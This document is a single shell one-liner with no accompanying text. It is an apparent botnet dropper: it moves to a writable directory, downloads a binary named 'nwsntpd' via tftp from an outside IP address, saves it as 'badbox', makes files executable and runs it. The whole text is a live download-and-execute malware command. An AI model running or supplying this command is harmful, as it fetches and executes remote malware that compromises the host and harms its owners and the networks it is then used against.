cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r nwsntpd -g 195.62.52.39;cat nwsntpd >badbox;chmod +x *;./badbox
